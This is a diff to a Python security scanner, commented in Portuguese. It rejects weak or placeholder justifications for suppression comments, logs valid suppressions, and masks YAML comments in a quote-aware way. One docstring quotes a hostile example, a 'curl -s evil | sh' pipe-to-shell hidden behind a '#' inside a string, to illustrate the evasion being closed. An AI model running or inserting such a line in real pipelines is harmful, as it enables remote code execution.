@@ -343,9 +343,26 @@ def _strip_py_comments(raw: str) -> str:
     return "".join(lines)
 
 
-def _extract_suppressions(raw: str, path_str: str, ext: str = "") -> tuple[dict[int, set[str]], list[tuple[str, str, str, str]]]:
+_HAZARD_OK_WEAK_WORDS = frozenset({"wip", "todo", "fixme", "ok", "later", "temp", "x"})
+
+
+def _hazard_ok_reason_weak(reason: str) -> bool:
+    """PT-13: motivo fraco/placeholder não vale supressão — exige >= 8 chars
+    e não pode ser só palavra-genérica (wip/todo/fixme/ok/later/temp/x)."""
+    r = reason.strip().lower()
+    if len(r) < 8:
+        return True
+    toks = [t for t in re.split(r"[^a-z0-9]+", r) if t]
+    return bool(toks) and all(t in _HAZARD_OK_WEAK_WORDS for t in toks)
+
+
+def _extract_suppressions(raw: str, path_str: str, ext: str = "",
+                          suppressed_log: list[tuple[str, str, int, str]] | None = None,
+                          ) -> tuple[dict[int, set[str]], list[tuple[str, str, str, str]]]:
     """Retorna ({lineno: {RULE}}, findings_de_supressao_invalida).
-    Supressões são permitidas ESTRITAMENTE em comentários reais."""
+    Supressões são permitidas ESTRITAMENTE em comentários reais.
+    `suppressed_log` (opcional) recebe (rule, path, lineno, motivo) de cada
+    supressão válida — inventário PT-13: supressão nunca é invisível."""
     suppressed: dict[int, set[str]] = {}
     bad_findings: list[tuple[str, str, str, str]] = []
 
@@ -364,20 +381,25 @@ def _extract_suppressions(raw: str, path_str: str, ext: str = "") -> tuple[dict[
             if not m:
                 continue
             tail = m.group(1).strip()
-            # Formato obrigatório: hazard-ok: RULE — motivo
+            # Formato obrigatório do marcador: ':' + RULE + ' — ' + motivo
             m_scoped = re.match(r"^:\s*([A-Z][A-Z0-9-]+)\s*(?:[—:-]|\s--)\s*(.+)$", tail)
             if m_scoped:
                 rule = m_scoped.group(1).strip()
                 reason = m_scoped.group(2).strip()
-                if len(reason) < 3:
+                # PT-13: razão fraca/placeholder (<8 chars ou só
+                # wip/todo/fixme/ok/later/temp/x) invalida a supressão.
+                if _hazard_ok_reason_weak(reason):
                     bad_findings.append((
                         "UNJUSTIFIED-SUPPRESSION", path_str, f"line:{cur_line}",
-                        f"hazard-ok for {rule} without justification reason"
+                        f"hazard-ok for {rule} with weak/placeholder reason "
+                        "(require >=8 chars and a meaningful justification)"
                     ))
                 else:
                     suppressed.setdefault(cur_line, set()).add(rule)
                     if span.end_line != cur_line:
                         suppressed.setdefault(span.end_line, set()).add(rule)
+                    if suppressed_log is not None:
+                        suppressed_log.append((rule, path_str, cur_line, reason))
             else:
                 bad_findings.append((
                     "UNJUSTIFIED-SUPPRESSION", path_str, f"line:{cur_line}",
@@ -397,6 +419,58 @@ def _is_suppressed(suppressed: dict[int, set[str]], lineno: int, rule: str) -> b
 def _strip_hash_comments(raw: str) -> str:
     """Remove comentários `# ...` de arquivos IaC/YAML/TOML/Terraform/Dockerfile preservando quebras de linha."""
     return "\n".join(re.sub(r"\s*#.*$", "", ln) for ln in raw.splitlines())
+
+
+def _mask_yaml_comments(raw: str) -> str:
+    """PT-09: '#' em YAML só abre comentário fora de aspas e (a) no início da
+    linha (só whitespace antes) ou (b) após whitespace. O strip cego
+    `\\s*#.*$` apagava `'echo "build #42"; curl -s evil | sh'` — o '#' dentro
+    de string escondia o pipe-to-shell.
+
+    Mini-scanner char-a-char por linha: '...' escapa com '' e "..." com \\
+    (estado de aspa não cruza linhas — conservador: conteúdo de scalar
+    multi-linha permanece visível às regras). Block scalars (|/>) não são
+    rastreados: '#' segue a regra de whitespace, que coincide com a
+    semântica de comentário do shell em blocos run:/script:.
+    """
+    out_lines: list[str] = []
+    for ln in raw.split("\n"):
+        i, n = 0, len(ln)
+        cut = n
+        in_sq = False
+        in_dq = False
+        while i < n:
+            c = ln[i]
+            if in_sq:
+                if c == "'":
+                    if i + 1 < n and ln[i + 1] == "'":
+                        i += 2  # '' escapado dentro de '...'
+                        continue
+                    in_sq = False
+                i += 1
+                continue
+            if in_dq:
+                if c == "\\":
+                    i += 2  # \" / \\ dentro de "..."
+                    continue
+                if c == '"':
+                    in_dq = False
+                i += 1
+                continue
+            if c == "'":
+                in_sq = True
+                i += 1
+                continue
+            if c == '"':
+                in_dq = True
+                i += 1
+                continue
+            if c == "#" and (i == 0 or ln[i - 1] in " \t"):
+                cut = i
+                break
+            i += 1
+        out_lines.append(ln[:cut].rstrip(" \t") if cut < n else ln)
+    return "\n".join(out_lines)
 
 
 _MANIFEST_CACHE: dict[str, set[tuple[str, str]]] = {}
@@ -829,7 +903,9 @@ def _scan_excluded_json(path: Path, max_bytes: int
 def scan_file(path: Path, extra_exts: set | None = None,
               max_bytes: int = MAX_FILE_BYTES,
               legacy_file_scope: bool = False,
-              fixtures_manifest: Path | None = None) -> tuple[int, list[tuple[str, str, str, str]], bool]:
+              fixtures_manifest: Path | None = None,
+              suppressed_log: list[tuple[str, str, int, str]] | None = None
+              ) -> tuple[int, list[tuple[str, str, str, str]], bool]:
     """Escaneia um arquivo de código ou manifesto IaC/Cloud. Retorna (1 se escaneado, findings, skipped_oversize)."""
     ext = path.suffix.lower()
     is_cfg = _is_config_file(path)
@@ -886,7 +962,7 @@ def scan_file(path: Path, extra_exts: set | None = None,
         return 0, [], True
 
     path_str = str(path)
-    suppressed, findings = _extract_suppressions(raw, path_str, ext)
+    suppressed, findings = _extract_suppressions(raw, path_str, ext, suppressed_log)
     exempt_rules = _get_manifest_exemptions(path, fixtures_manifest=fixtures_manifest)
 
     def add(rule: str, line_no: int, scope: str, msg: str) -> None:
@@ -897,7 +973,12 @@ def scan_file(path: Path, extra_exts: set | None = None,
 
     # --- PASS 2 / CONFIG: Strings preservadas, comentários removidos ---
     if is_cfg and ext not in SCAN_EXTS:
-        no_comments = _pg.mask_comments_only(raw, ".js") if ext == ".json" else _strip_hash_comments(raw)
+        if ext == ".json":
+            no_comments = _pg.mask_comments_only(raw, ".js")
+        elif ext in (".yml", ".yaml"):
+            no_comments = _mask_yaml_comments(raw)  # PT-09
+        else:
+            no_comments = _strip_hash_comments(raw)
     else:
         no_comments = _strip_py_comments(raw) if ext == ".py" else _pg.mask_comments_only(raw, ext)
 
@@ -1231,7 +1312,9 @@ def _check_env_committed(target: Path) -> list[tuple[str, str, str, str]]:
 
 def scan_path(target: Path, dist_mode: bool = False,
               legacy_file_scope: bool = False,
-              fixtures_manifest: Path | None = None) -> tuple[int, list[tuple[str, str, str, str]], int]:
+              fixtures_manifest: Path | None = None,
+              suppressed_log: list[tuple[str, str, int, str]] | None = None
+              ) -> tuple[int, list[tuple[str, str, str, str]], int]:
     """Escaneia arquivo ou diretório. Retorna (files_scanned, findings, oversize_skipped).
     `dist_mode` amplia extensões para bundles compilados (.js/.mjs/.cjs/.map/.html/.json)
     e eleva o teto para 8MB por arquivo."""
@@ -1241,7 +1324,8 @@ def scan_path(target: Path, dist_mode: bool = False,
         sc, fnd, ov = scan_file(target, DIST_EXTS if dist_mode else None,
                                 DIST_MAX_FILE_BYTES if dist_mode else MAX_FILE_BYTES,
                                 legacy_file_scope=legacy_file_scope,
-                                fixtures_manifest=fixtures_manifest)
+                                fixtures_manifest=fixtures_manifest,
+                                suppressed_log=suppressed_log)
         return sc, fnd, (1 if ov else 0)
 
     total_scanned = 0
@@ -1261,7 +1345,8 @@ def scan_path(target: Path, dist_mode: bool = False,
             sc, fnd, ov = scan_file(p, DIST_EXTS if dist_mode else None,
                                     DIST_MAX_FILE_BYTES if dist_mode else MAX_FILE_BYTES,
                                     legacy_file_scope=legacy_file_scope,
-                                    fixtures_manifest=fixtures_manifest)
+                                    fixtures_manifest=fixtures_manifest,
+                                    suppressed_log=suppressed_log)
             total_scanned += sc
             all_findings.extend(fnd)
             if ov:
@@ -1298,6 +1383,7 @@ def main() -> None:
 
     total_files = 0
     findings: list[tuple[str, str, str, str]] = []
+    suppressed_log: list[tuple[str, str, int, str]] = []
     oversize = 0
     for raw_p in targets:
         p = Path(raw_p)
@@ -1306,7 +1392,8 @@ def main() -> None:
             sys.exit(2)
         sc, fnd, ov = scan_path(p, dist_mode=dist_mode,
                                 legacy_file_scope=args.legacy_file_scope,
-                                fixtures_manifest=args.fixtures_manifest)
+                                fixtures_manifest=args.fixtures_manifest,
+                                suppressed_log=suppressed_log)
         total_files += sc
         findings.extend(fnd)
         oversize += ov
@@ -1335,6 +1422,11 @@ def main() -> None:
                     {"rule": r, "location": loc, "scope": sc, "message": msg}
                     for r, loc, sc, msg in findings
                 ],
+                # PT-13: inventário de supressões válidas — nunca invisível.
+                "suppressed": [
+                    {"rule": r, "location": f"{loc}:{ln}", "reason": rs}
+                    for r, loc, ln, rs in suppressed_log
+                ],
             }
             if oversize_gap:
                 payload["coverage_gaps"] = [
@@ -1347,6 +1439,13 @@ def main() -> None:
             if oversize_gap:
                 print(f"{'OVERSIZE-GAP':<26} --allow-oversize  [coverage-gap]  "
                       f"{oversize} arquivo(s) pulados sem análise — lacuna de cobertura aceita explicitamente")
+            # PT-13: supressão nunca é invisível — inventário na seção final.
+            _seen_sup: set[tuple[str, str, int, str]] = set()
+            for r, loc, ln, rs in suppressed_log:
+                if (r, loc, ln, rs) in _seen_sup:
+                    continue
+                _seen_sup.add((r, loc, ln, rs))
+                print(f"SUPPRESSED: {r} @ {loc}:{ln} ({rs})")
             print(f"{total_files} file(s) scanned, {len(findings)} finding(s), {oversize} oversize skipped")
         sys.stdout.flush()
     except BrokenPipeError:
